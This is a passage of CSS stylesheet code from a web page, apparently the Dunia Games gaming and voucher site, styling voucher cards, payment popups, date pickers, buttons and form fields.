        .ngx-editor-textarea[_ngcontent-gtc-c24] a[_ngcontent-gtc-c24] {
            text-decoration: none !important;
            border: none !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c24] *[_ngcontent-gtc-c24] {
            max-width: 100% !important;
            font-family: Montserrat !important;
            background: 0 0 !important;
            line-height: 1.5;
            word-break: break-word !important;
            text-indent: unset !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c24] b[_ngcontent-gtc-c24] {
            font-family: Montserrat-Bold !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c24] b[_ngcontent-gtc-c24] *[_ngcontent-gtc-c24] {
            font-family: Montserrat-Bold !important;
            text-indent: unset !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c24] td[_ngcontent-gtc-c24] {
            border-color: #6a707d !important;
            padding: 8px !important
        }

        .app-layout-wrap[_ngcontent-gtc-c24] {
            background-color: #000
        }

        @media (min-width:1200px) {
            .d-main[_ngcontent-gtc-c24] {
                max-width: 1440px;
                margin: 0 auto
            }
            .layout-content[_ngcontent-gtc-c24] {
                background-color: #000
            }
        }

        .d-absolute--center[_ngcontent-gtc-c24] {
            position: absolute;
            top: 40%;
            width: 100%;
            text-align: center;
            z-index: 2
        }

        .d-absolute--center[_ngcontent-gtc-c24] img[_ngcontent-gtc-c24] {
            width: 50px;
            opacity: .5
        }

        .section-other-voucher[_ngcontent-gtc-c24] {
            width: 100%;
            display: grid
        }

        .section-other-voucher[_ngcontent-gtc-c24] h2[_ngcontent-gtc-c24] {
            margin: 30px 0 15px;
            font-family: Montserrat;
            font-size: 16px;
            font-weight: 600;
            font-stretch: normal;
            font-style: normal;
            line-height: 1.5;
            letter-spacing: normal;
            color: #fff
        }

        .section-other-voucher[_ngcontent-gtc-c24] .card-voucher[_ngcontent-gtc-c24] {
            display: inline-block;
            background-color: #2b2e34;
            padding: 8px 14px;
            width: 100%;
            border-radius: 6px;
            box-shadow: 0 8px 10px 0 rgba(0, 0, 0, .23);
            cursor: pointer;
            margin-bottom: 10px;
            font-family: Montserrat;
            color: #a6a6b2;
            text-decoration: none
        }

        .section-other-voucher[_ngcontent-gtc-c24] .card-voucher[_ngcontent-gtc-c24]:hover {
            background-color: #22252b
        }

        .section-other-voucher[_ngcontent-gtc-c24] .card-voucher[_ngcontent-gtc-c24] .logo-voucher[_ngcontent-gtc-c24] {
            width: 48px;
            float: left;
            border-radius: 100%;
            border: 1px solid #6e6e6e
        }

        .section-other-voucher[_ngcontent-gtc-c24] .card-voucher[_ngcontent-gtc-c24] .title-voucher[_ngcontent-gtc-c24] {
            margin: 14px 0 14px 60px;
            position: relative;
            font-family: Montserrat
        }

        .section-other-voucher[_ngcontent-gtc-c24] .header-more[_ngcontent-gtc-c24] {
            margin: 25px 10px 20px 0;
            right: 0;
            top: 50%;
            transform: translateY(-50%);
            float: left
        }

        @media (max-width:991px) {
            .section-other-voucher[_ngcontent-gtc-c24] h2[_ngcontent-gtc-c24] {
                margin-top: 10px
            }
            .section-other-voucher[_ngcontent-gtc-c24] .header-more[_ngcontent-gtc-c24] {
                float: left;
                margin-bottom: 13px;
                top: 50%;
                right: 0;
                left: auto;
                margin-left: 0
            }
        }

        @media (max-width:767px) {
            .section-other-voucher[_ngcontent-gtc-c24] .header-more[_ngcontent-gtc-c24] {
                float: left;
                margin-bottom: 13px;
                top: 50%;
                right: 0;
                left: auto;
                margin-left: 0
            }
        }

        .section-other-voucher[_ngcontent-gtc-c24] .header-more[_ngcontent-gtc-c24] a[_ngcontent-gtc-c24] {
            font-family: Montserrat;
            color: #fff;
            font-size: 14px;
            font-weight: 600;
            text-transform: uppercase;
            text-decoration: none
        }

        .section-other-voucher[_ngcontent-gtc-c24] .header-more[_ngcontent-gtc-c24] a[_ngcontent-gtc-c24] span[_ngcontent-gtc-c24] {
            position: relative;
            display: inline-block;
            height: 18px;
            width: 18px;
            margin: -4px 10px;
            background: #d0021b;
            overflow: hidden;
            border-radius: 3px
        }

        .section-other-voucher[_ngcontent-gtc-c24] .header-more[_ngcontent-gtc-c24] a[_ngcontent-gtc-c24] span[_ngcontent-gtc-c24]::after {
            position: absolute;
            font-family: FontAwesome;
            content: "\f105";
            right: 7px;
            bottom: 0
        }
    </style>
    <meta name="keywords" content="dunia games, dg, game news, latest games, download latest games">
    <style>
        .justify-content-left {
            justify-content: left !important
        }

        .justify-content-center {
            justify-content: center !important
        }

        .justify-content-right {
            justify-content: right !important
        }

        .justify-content-space-between {
            justify-content: space-between !important
        }

        .justify-content-flex-end {
            justify-content: flex-end !important
        }

        .text-decoration-line-through {
            text-decoration: line-through !important
        }

        .text-decoration-underline {
            text-decoration: underline !important
        }

        .text-decoration-overline {
            text-decoration: overline !important
        }

        .text-decoration-none {
            text-decoration: none !important
        }

        .align-self-center {
            align-self: center
        }

        .cursor-no-drop {
            cursor: no-drop !important
        }

        .cursor-pointer {
            cursor: pointer !important
        }

        .text-left {
            text-align: left !important
        }

        .text-center {
            text-align: center !important
        }

        .text-right {
            text-align: right !important
        }

        .text-justify {
            text-align: justify !important
        }

        .v-align-top {
            vertical-align: top !important
        }

        .v-align-middle {
            vertical-align: middle !important
        }

        .v-align-bottom {
            vertical-align: bottom !important
        }

        .float-left {
            float: left !important
        }

        .float-right {
            float: right !important
        }

        .mat-datepicker-toggle button.mat-icon-button {
            position: absolute;
            right: 0;
            top: 25px;
            width: 24px;
            height: 24px;
            color: #6a707d
        }

        .mat-datepicker-toggle button.mat-icon-button span.mat-button-wrapper,
        .mat-datepicker-toggle button.mat-icon-button span.mat-button-wrapper svg.mat-datepicker-toggle-default-icon {
            position: absolute;
            left: 0;
            top: 0;
            max-width: 24px;
            max-height: 24px
        }

        .cust-dropdown {
            position: relative
        }

        .cust-dropdown i.fa-caret-down {
            position: absolute;
            width: 9px;
            height: 15px;
            top: 0;
            bottom: 0;
            right: 5px;
            margin: auto
        }

        .cust-dropdown input[type=text] {
            width: calc(100% - 10px);
            padding: 5px 10px;
            margin-right: 10px;
            background: 0 0;
            border: 0;
            outline: 0
        }

        .cust-dropdown .cust-option {
            display: none;
            position: absolute;
            min-width: 100%;
            top: 100%;
            background: #1d1f23;
            z-index: 99;
            padding: 15px 25px;
            box-shadow: 0 3px 8px 0 rgba(0, 0, 0, .35);
            border-radius: 3px
        }

        .cust-dropdown .cust-option.active {
            display: block
        }

        .cust-dropdown .cust-option ul.option-list {
            margin: 0;
            padding: 0;
            list-style: none
        }

        .cust-dropdown .cust-option ul.option-list li {
            margin: 0;
            padding: 0;
            list-style: none;
            position: relative
        }

        .cust-dropdown .cust-option ul.option-list li label {
            display: block;
            margin: 0;
            padding: 10px 0 10px 30px
        }

        .cust-dropdown .cust-option ul.option-list li label:before {
            content: "";
            position: absolute;
            width: 20px;
            height: 20px;
            top: 0;
            bottom: 0;
            left: 0;
            margin: auto;
            border: 1px solid #fff;
            border-radius: 50%
        }

        .cust-dropdown .cust-option ul.option-list li label:after {
            content: "";
            opacity: 0;
            position: absolute;
            width: 10px;
            height: 10px;
            top: 0;
            bottom: 0;
            left: 5px;
            margin: auto;
            border: 1px solid #fff;
            background: #fff;
            border-radius: 50%
        }

        .cust-dropdown .cust-option ul.option-list li input[type=radio] {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            opacity: 0
        }

        .cust-dropdown .cust-option ul.option-list li input[type=radio]:checked+label:after {
            opacity: 1
        }

        html {
            scroll-behavior: smooth
        }

        body {
            margin: 0;
            padding: 0;
            overflow-x: hidden !important
        }

        a,
        label,
        ol li,
        table td,
        table th,
        ul li {
            font-family: Montserrat
        }

        b {
            font-family: Montserrat-Bold;
            font-weight: 800
        }

        h1,
        h2,
        h3,
        h4,
        h5,
        h6,
        p,
        span {
            margin: 0;
            font-family: Montserrat
        }

        button {
            outline: 0;
            font-family: Montserrat
        }

        input,
        textarea {
            font-family: Montserrat;
            color: #fff
        }

        label.error-label {
            margin: 5px 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 400;
            color: #d0021b;
            display: block
        }

        label.success-label {
            margin: 5px 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 400;
            color: green;
            display: block
        }

        label.label-input {
            display: block;
            font-family: Montserrat;
            font-size: 12px;
            color: #6a707d;
            margin-bottom: 10px
        }

        @media (max-width:767px) {
            label.label-input {
                font-size: 11px
            }
        }

        label.label-media {
            display: block;
            font-family: Montserrat;
            font-size: .8em;
            color: #6a707d;
            margin-bottom: 10px
        }

        .close-solid {
            padding: 5px;
            height: 30px;
            width: 30px;
            background: 0 0;
            border: none;
            cursor: pointer
        }

        .close-solid span {
            height: 100%;
            width: 100%;
            display: inline-block;
            background-image: url(close-global.785be75897033bcf1c3f.png);
            background-size: 50px;
            background-repeat: no-repeat;
            background-position: center
        }

        .close-circle-wrap {
            position: relative;
            float: right;
            margin-top: 20px;
            z-index: 1;
            background: 0 0;
            border: none
        }

        .close-circle-wrap p {
            display: inline-block;
            vertical-align: middle;
            color: #fff;
            font-family: Montserrat-Bold;
            font-weight: 600;
            font-size: .9em;
            text-transform: uppercase
        }

        @media (max-width:767px) {
            .close-circle-wrap p {
                font-size: .75em
            }
        }

        .close-circle-wrap p.close-circle {
            height: 42px;
            width: 42px;
            background: 0 0;
            border: 2px solid #fff;
            cursor: pointer;
            padding: 12px;
            margin-left: 10px;
            border-radius: 100%;
            opacity: .5
        }

        .close-circle-wrap p.close-circle span {
            height: 100%;
            width: 100%;
            display: inline-block;
            background-image: url(close-global.785be75897033bcf1c3f.png);
            background-size: 50px;
            background-repeat: no-repeat;
            background-position: center
        }

        .cta.cta--generate {
            margin-top: 30px;
            padding: 16px 27px;
            background: #d0021b;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: none;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--create {
            text-decoration: none;
            padding: 10px 5px 10px 30px;
            background: #d0021b;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: 1px solid transparent;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--create span {
            font-family: Montserrat;
            font-size: .8em;
            color: #fff;
            background: #9c0114;
            padding: 5px 10px;
            display: inline-block;
            border-radius: 3px;
            margin: 0 10px
        }

        .cta.cta--border-transparent {
            text-decoration: none;
            padding: 10px 40px;
            background: 0 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: 1px solid #fff;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--transparent-white {
            font-family: Montserrat;
            border: 1px solid #fff;
            padding: 15px 20px;
            border-radius: 4px;
            background: 0 0;
            outline: 0;
            font-size: .9em;
            font-weight: 600;
            color: #fff;
            text-transform: uppercase;
            text-decoration: none;
            letter-spacing: 1px
        }

        .cta.cta--solid-grey {
            font-family: Montserrat;
            border: 1px solid transparent;
            padding: 15px 60px;
            border-radius: 4px;
            background: #2d2d30;
            outline: 0;
            font-size: .9em;
            font-weight: 600;
            color: #6b6b6d;
            text-transform: uppercase;
            text-decoration: none;
            letter-spacing: 1px
        }

        a.close-frame {
            position: absolute;
            right: 30px;
            top: 0;
            font-family: Montserrat;
            color: #fff;
            font-size: .9em;
            font-weight: 400;
            text-transform: uppercase;
            opacity: 1;
            z-index: 10
        }

        a.close-frame.close-frame--tournament span {
            padding: 4px 9px 4px 12px;
            border: 3px solid #6a707d;
            width: 42px;
            height: 42px;
            font-size: 20px;
            font-weight: 700;
            top: 16px
        }

        a.close-frame.close-frame--tournament p {
            font-family: Montserrat;
            font-size: 13px;
            font-weight: 700;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.23;
            letter-spacing: 1.4px;
            text-align: center;
            color: #fff
        }

        a.close-frame p {
            display: inline-block
        }

        @media (max-width:767px) {
            a.close-frame {
                right: 10px
            }
            a.close-frame p {
                display: none
            }
        }

        a.close-frame span {
            margin-left: 10px;
            font-family: Montserrat;
            display: inline-block;
            width: 30px;
            height: 30px;
            padding: 5px 10px;
            border: 1px solid #6a707d;
            color: #6a707d;
            font-weight: 600;
            overflow: hidden;
            border-radius: 100%;
            position: relative;
            right: 0;
            top: 10px
        }

        .form-control {
            position: relative;
            font-family: Montserrat !important;
            font-size: 1em;
            outline: 0;
            background: 0 0;
            border-radius: 0;
            box-shadow: none
        }

        .form-control.form-control--default {
            padding: 0;
            border: none;
            border-bottom: 1px solid rgba(106, 112, 125, .49);
            box-shadow: none;
            color: #fff
        }

        .form-control.form-control--count {
            text-align: center;
            margin: 0 10px 10px;
            width: 50px;
            padding: 0;
            border: none;
            border-bottom: 1px solid rgba(106, 112, 125, .49);
            box-shadow: none;
            color: #fff
        }

        .form-control.form-control--transparent {
            outline: 0;
            color: #fff;
            font-size: 1em;
            box-shadow: none;
            padding: 0;
            background: 0 0;
            border: none;
            box-shadow: none
        }

        .form-control.form-control--textarea {
            outline: 0;
            color: #fff;
            font-size: 1em;
            box-shadow: none;
            padding: 10px;
            border-radius: 4px;
            background-color: rgba(106, 112, 125, .19);
            border: none;
            box-shadow: none
        }

        .form-control::-moz-placeholder {
            color: #69707e
        }

        .form-control::-ms-input-placeholder {
            color: #69707e
        }

        .form-control::placeholder {
            color: #69707e
        }

        .header-text h3 {
            font-family: Montserrat-Bold;
            font-size: 2.3em;
            text-transform: capitalize;
            color: #fff
        }

        @media (max-width:767px) {
            a.close-frame span {
                right: 10px
            }
            .header-text h3 {
                font-size: 1.5em
            }
        }

        .header-text h4 {
            font-family: Montserrat-Bold;
            font-size: 1.5em;
            color: #fff
        }

        .header-text p {
            font-family: Montserrat;
            font-size: 1em;
            font-weight: 400;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.5;
            letter-spacing: normal;
            text-align: center;
            color: #b4b4c0
        }

        .header-text-medium h3 {
            font-family: Montserrat-Bold;
            font-size: 2em;
            color: #fff
        }

        .header-text-small h3 {
            font-family: Montserrat-Bold;
            font-size: 1.5em;
            color: #fff
        }

        @media (max-width:767px) {
            .header-text-medium h3,
            .header-text-small h3 {
                font-size: 1.5em
            }
        }

        .header-text-extra-small h3 {
            font-family: Montserrat;
            font-size: 1.2em;
            color: #fff
        }

        @media (max-width:767px) {
            .header-text-extra-small h3 {
                font-size: 1em
            }
        }

        .header-text-extra-small-bold h3 {
            font-family: Montserrat-Bold;
            font-size: 1.2em;
            color: #fff
        }

        .body-text p {
            font-family: Montserrat;
            font-size: 1em;
            font-weight: 400;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.5;
            letter-spacing: normal;
            text-align: center;
            color: #b4b4c0
        }

        .description-text p {
            font-size: 1em;
            color: #fff
        }

        .radio-input {
            position: absolute;
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            height: 100%;
            width: 100%;
            z-index: 9;
            opacity: 0
        }

        .middle-top {
            margin: auto;
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            transform: translateY(-50%)
        }

        .fleft {
            float: left
        }

        .fright {
            float: right
        }

        .row .padding-left-0 {
            padding-left: 0
        }

        .form-group.form-group--media {
            position: relative;
            border-bottom: 1px solid #2b2e34
        }

        .dd-selected {
            background: 0 0
        }

        .invalid-feedback {
            text-align: left;
            position: relative;
            z-index: 1
        }

        .popup-shuffle {
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            z-index: 99
        }

        .popup-shuffle:before {
            content: "";
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            background-color: rgba(0, 0, 0, .8)
        }

        .popup-shuffle .shuffle-container {
            width: 400px;
            height: 120px;
            max-width: 90vw;
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            margin: auto;
            border: 3px solid #6a707d;
            background: #1d1f23;
            border-radius: 4px;
            display: block
        }

        .popup-shuffle .shuffle-container>.row {
            display: block;
            position: absolute;
            top: 50%;
            transform: translateY(-50%)
        }

        .popup-shuffle .shuffle-container .shuffle-pop-table {
            display: table
        }

        .popup-shuffle .shuffle-container .shuffle-pop-table .shuffle-pop-item {
            display: table-cell;
            vertical-align: middle;
            width: 80%;
            padding-left: 20px
        }

        .popup-shuffle .shuffle-container .shuffle-pop-table .shuffle-pop-item.img {
            width: 20%;
            padding-left: 0
        }

        .popup-shuffle .shuffle-container img {
            max-width: 100%
        }

        .popup-shuffle .shuffle-container p {
            color: #fff;
            font-size: 1em
        }

        .popup-shuffle .shuffle-container p strong {
            font-size: 1.09em
        }

        .mat-datepicker-content {
            background: #1d1f23
        }

        .mat-calendar-body-cell-content {
            color: #fff
        }

        .mat-calendar-body-disabled>.mat-calendar-body-cell-content:not(.mat-calendar-body-selected) {
            color: #616161
        }

        .mat-calendar-body-label,
        .mat-calendar-table-header th,
        .mat-datepicker-content .mat-calendar-next-button,
        .mat-datepicker-content .mat-calendar-previous-button,
        .mat-datepicker-toggle,
        .mat-icon-button[disabled][disabled] {
            color: #fff
        }

        .mat-calendar-arrow {
            border-top-color: #fff
        }

        .mat-calendar-header {
            color: #fff
        }

        .cdk-keyboard-focused .mat-calendar-body-active>.mat-calendar-body-cell-content:not(.mat-calendar-body-selected),
        .cdk-program-focused .mat-calendar-body-active>.mat-calendar-body-cell-content:not(.mat-calendar-body-selected),
        .mat-calendar-body-cell:not(.mat-calendar-body-disabled):hover>.mat-calendar-body-cell-content:not(.mat-calendar-body-selected),
        .mat-calendar-body-today:not(.mat-calendar-body-selected) {
            border-color: transparent;
            background: #d0021b
        }

        .mat-calendar-body-selected {
            background: #d0021b;
            box-shadow: none
        }

        .block-url {
            position: absolute;
            content: "";
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            z-index: 91
        }

        @media (max-width:767px) {
            .header-text-extra-small-bold h3 {
                font-size: 1em
            }
            .fleft {
                float: right
            }
            .fright {
                float: left
            }
            .popup-shuffle .shuffle-container .shuffle-pop-table {
                padding: 0 20px
            }
            .mat-datepicker-toggle button.mat-icon-button {
                top: auto;
                bottom: 7px
            }
            .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo.wrap-paymentInfo-footer-new p {
                font-size: 16px;
                font-weight: 600
            }
        }

        .mat-primary .mat-option.mat-selected:not(.mat-option-disabled) {
            color: #000;
            opacity: .8
        }

        .mat-select-panel .mat-option {
            color: #797979
        }

        .ngx-editor-textarea div,
        .ngx-editor-textarea section {
            max-width: 100% !important;
            width: 100% !important;
            background: 0 0 !important;
            box-shadow: none !important
        }

        .ngx-editor-textarea div img,
        .ngx-editor-textarea section img {
            width: 100% !important
        }

        .ngx-editor-textarea a {
            text-decoration: none !important;
            border: none !important
        }

        .ngx-editor-textarea * {
            max-width: 100% !important;
            font-family: Montserrat !important;
            background: 0 0 !important;
            line-height: 1.5;
            word-break: break-word !important;
            text-indent: unset !important
        }

        .ngx-editor-textarea b {
            font-family: Montserrat-Bold !important
        }

        .ngx-editor-textarea b * {
            font-family: Montserrat-Bold !important;
            text-indent: unset !important
        }

        .ngx-editor-textarea td {
            border-color: #6a707d !important;
            padding: 8px !important
        }

        .app-layout-wrap {
            background-color: #000
        }

        @media (min-width:1200px) {
            .d-main {
                max-width: 1440px;
                margin: 0 auto
            }
            .layout-content {
                background-color: #000
            }
        }

        .d-absolute--center {
            position: absolute;
            top: 40%;
            width: 100%;
            text-align: center;
            z-index: 2
        }

        .d-absolute--center img {
            width: 50px;
            opacity: .5
        }

        .popup-WrapDialog {
            max-height: 100%
        }

        .popup-WrapDialog h3,
        .popup-WrapDialog p,
        .popup-WrapDialog span {
            word-break: break-word
        }

        .popup-WrapDialog .mat-dialog-actions {
            display: block;
            align-items: unset;
            min-height: 30px;
            padding: 25px 20px 0;
            text-align: right;
            margin: 0
        }

        .popup-WrapDialog .mat-dialog-actions .close-reset img {
            cursor: pointer;
            width: 17px;
            height: 17px;
            -o-object-fit: contain;
            object-fit: contain
        }

        .popup-WrapDialog h3 {
            font-size: 24px;
            margin-bottom: 15px
        }

        @media (max-width:991px) {
            .popup-WrapDialog {
                padding: 15px
            }
            .popup-WrapDialog .mat-dialog-actions {
                margin-bottom: 0;
                padding-top: 15px
            }
            .popup-WrapDialog h3 {
                font-size: 18px
            }
            .popup-WrapDialog p {
                font-size: 16px
            }
        }

        .popup-WrapDialog p {
            font-size: 16px
        }

        .popup-WrapDialog b {
            font-family: Montserrat-bold
        }

        .popup-WrapDialog .wrap-titleDialog {
            margin-bottom: 30px
        }

        .popup-WrapDialog .wrap-titleDialog p {
            font-size: 14px
        }

        .popup-WrapDialog .wrap-titleDialog h3 {
            margin-bottom: 10px
        }

        .popup-WrapDialog .wrap-titleDialog.wrap-titleDialog-step2 {
            margin-bottom: 15px
        }

        .popup-WrapDialog h4 {
            font-size: 18px
        }

        .popup-WrapDialog label {
            color: #69707e;
            font-family: Montserrat;
            margin-bottom: 10px;
            display: block;
            font-size: 16px
        }

        @media (max-width:991px) {
            .popup-WrapDialog .wrap-titleDialog {
                margin-bottom: 25px
            }
            .popup-WrapDialog label {
                font-size: 16px
            }
        }

        .popup-WrapDialog label.error-label {
            margin: 5px 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 400;
            color: #d0021b;
            display: block
        }

        .popup-WrapDialog p {
            color: #ffff
        }

        .popup-WrapDialog button {
            background-color: transparent;
            border: 1px solid transparent;
            color: #fff;
            padding: 13px 20px;
            border-radius: 3px;
            text-transform: uppercase;
            font-family: Montserrat;
            font-weight: 600;
            letter-spacing: 1px;
            font-size: 12px;
            display: block;
            margin: auto;
            min-width: 165px
        }

        .popup-WrapDialog button.btn-red {
            background-color: #d0021b;
            border: 1px solid #d0021b
        }

        .popup-WrapDialog button.btn-transparent {
            background-color: transparent;
            border: 1px solid #ffff
        }

        .popup-WrapDialog .form-group.form-group-transparentBorder .form-control {
            border: 0;
            border-bottom: 1px solid #3c3c44;
            outline: 0;
            padding: 0;
            color: #ffff;
            box-shadow: none;
            font-size: 12px;
            background-color: unset
        }

        .popup-WrapDialog .form-group.form-group-transparentBorder .form-control:focus {
            outline: 0;
            box-shadow: none
        }

        .popup-WrapDialog .form-group.form-group-transparentBorder label {
            margin-bottom: 5px
        }

        .popup-WrapDialog.paymentPopupInfo {
            padding: 0
        }

        .popup-WrapDialog .container-paymentInfo {
            text-align: left
        }

        .popup-WrapDialog .container-paymentInfo h4 {
            margin-bottom: 20px;
            font-weight: 600;
            font-family: Montserrat-bold;
            line-height: 1.5;
            font-size: 16px
        }

        .popup-WrapDialog .container-paymentInfo h4.text-center {
            font-family: Montserrat;
            font-weight: 400;
            font-size: 13.5px
        }

        .popup-WrapDialog .container-paymentInfo h4 span {
            font-family: inherit;
            font-size: inherit;
            line-height: inherit;
            color: inherit
        }

        .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo {
            padding: 0 70px
        }

        .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo .wrap-paymentInfo-left,
        .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo .wrap-paymentInfo-right-new {
            float: left;
            display: inline-block
        }

        .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo .wrap-paymentInfo-left {
            width: calc(84px + 15px)
        }

        .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo .wrap-paymentInfo-left img {
            border-radius: 5%;
            height: 84px;
            width: 84px;
            -o-object-fit: contain;
            object-fit: contain
        }

        @media (max-width:991px) {
            .popup-WrapDialog button {
                display: block;
                font-size: 10px;
                width: 100%
            }
            .popup-WrapDialog .container-paymentInfo h4.text-center {
                font-size: 12px
            }
            .popup-WrapDialog .container-paymentInfo h4 span {
                display: block
            }
            .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo {
                padding: 0 25px
            }
            .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo .wrap-paymentInfo-left,
            .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo .wrap-paymentInfo-right-new {
                float: none;
                display: block
            }
            .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo .wrap-paymentInfo-left {
                width: auto
            }
            .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo .wrap-paymentInfo-left img {
                float: left;
                display: inline-block
            }
            .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo .wrap-paymentInfo-left h4 {
                width: calc(100% - 105px);
                float: left;
                display: inline-block;
                padding-left: 10px;
                line-height: 1.5;
                font-size: 16px
            }
        }

        .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo .wrap-paymentInfo-right-new {
            width: 100%;
            border: 1px solid #6a707d;
            border-radius: 6px;
            padding: 16px 15px;
            margin-bottom: 15px
        }

        .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo .wrap-paymentInfo-right-new .form-group {
            margin-bottom: 10px
        }

        .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo .wrap-paymentInfo-right-new h4 {
            padding-left: 15px
        }

        .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo .wrap-paymentInfo-right-new p {
            text-align: left
        }

        .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo .wrap-paymentInfo-right-new label {
            margin-bottom: 0
        }

        .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo.wrap-paymentInfo-Email-new {
            padding-top: 30px;
            background-color: #25262d
        }

        .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo.wrap-paymentInfo-Email-new p {
            font-size: 16px;
            text-align: left;
            margin-bottom: 15px
        }

        @media (max-width:991px) {
            .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo .wrap-paymentInfo-right-new {
                width: auto;
                margin-top: 15px
            }
            .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo .wrap-paymentInfo-right-new h4 {
                width: calc(100% - 105px);
                float: left;
                display: inline-block;
                padding-left: 10px;
                line-height: 1.5;
                font-size: 16px
            }
            .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo.wrap-paymentInfo-Email-new {
                padding-top: 20px;
                padding-bottom: 20px
            }
            .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo.wrap-paymentInfo-Email-new p {
                margin-bottom: 15px
            }
        }

        .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo.wrap-paymentInfo-Email-new .form-group label {
            font-size: 12px
        }

        .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo.wrap-paymentInfo-footer-new {
            background-color: #131319;
            padding-top: 25px;
            padding-bottom: 25px;
            font-family: Montserrat
        }

        @media (max-width:991px) {
            .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo.wrap-paymentInfo-footer-new {
                padding-top: 20px;
                padding-bottom: 15px
            }
        }

        .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo.wrap-paymentInfo-footer-new p {
            font-size: 16px;
            text-align: left;
            margin-bottom: 15px
        }

        .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo.wrap-paymentInfo-footer-new .form-group label {
            font-size: 12px
        }

        .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo.wrap-paymentInfo-footer-new .form-group:last-child {
            margin-bottom: 0
        }

        .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo.wrap-paymentInfo-footer-new .phone-list label {
            display: block;
            font-size: 14px;
            color: #69707e
        }

        .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo.wrap-paymentInfo-footer-new .phone-list .list-item-roles {
            margin-left: 10px;
            text-align: center;
            margin-top: 15px
        }

        .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo.wrap-paymentInfo-footer-new .phone-list .list-item-roles .item {
            cursor: pointer;
            font-size: 14px;
            display: inline-block;
            vertical-align: middle;
            width: 155px;
            height: 50px;
            border-radius: 4px;
            border: 1px solid rgba(106, 112, 125, .49);
            text-align: center;
            padding: 13px 0;
            margin-right: 10px;
            margin-bottom: 10px
        }

        .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo.wrap-paymentInfo-footer-new .phone-list .list-item-roles .item p {
            color: #fff;
            opacity: .3;
            text-align: center;
            font-size: 14px;
            font-family: Montserrat
        }

        .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo.wrap-paymentInfo-footer-new .phone-list .list-item-roles .item.active {
            border: 2px solid rgba(106, 112, 125, .49);
            background: rgba(255, 255, 255, .06)
        }

        .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo.wrap-paymentInfo-footer-new .phone-list .list-item-roles .item.active p {
            opacity: 1;
            text-align: center;
            font-size: 14px;
            font-family: Montserrat
        }

        .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo.wrap-paymentInfo-confirm {
            padding-top: 15px;
            padding-bottom: 35px
        }

        .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo.wrap-paymentInfo-confirm h4,
        .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo.wrap-paymentInfo-confirm p {
            font-size: 13.5px;
            font-weight: 400
        }

        .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo.wrap-paymentInfo-confirm p {
            text-align: center;
            margin-bottom: 35px
        }

        .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo.wrap-paymentInfo-confirm .btn-red {
            margin-bottom: 15px;
            width: 100%
        }

        .paymentPopupInfo ::-webkit-scrollbar {
            width: 5px;
            background: #2d2e32
        }

        .paymentPopupInfo ::-webkit-scrollbar-thumb {
            background-color: #3d3e42;
            opacity: .5
        }

        .paymentPopupInfo .paymentInfo-step h3,
        .paymentPopupInfo .wrap-titleDialog h3 {
            font-size: 24px !important
        }

        .paymentPopupInfo .paymentInfo-step.noActive,
        .paymentPopupInfo .wrap-titleDialog.noActive {
            display: none
        }

        @media (max-width:767px) {
            .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo.wrap-paymentInfo-footer-new .phone-list .list-item-roles .item {
                width: 45%
            }
